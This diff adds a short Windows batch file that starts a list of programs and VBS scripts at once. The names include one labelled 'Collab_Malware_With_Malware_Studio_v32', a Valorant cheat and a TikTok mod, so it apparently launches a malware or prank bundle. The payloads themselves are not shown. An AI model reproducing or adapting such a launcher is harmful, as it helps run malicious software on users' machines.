@@ -1,0 +1,12 @@
+echo off
+start Qualtei
+start RadialBlur
+start Rgb_screen
+start ScreenSoothingEffect
+start TikTok_Mod2
+start cheats_VALORANT_2
+start Collab_Malware_With_Malware_Studio_v32
+start ChorumeSafe
+start Sound.vbs
+start messages.vbs
+start messages2.vbs
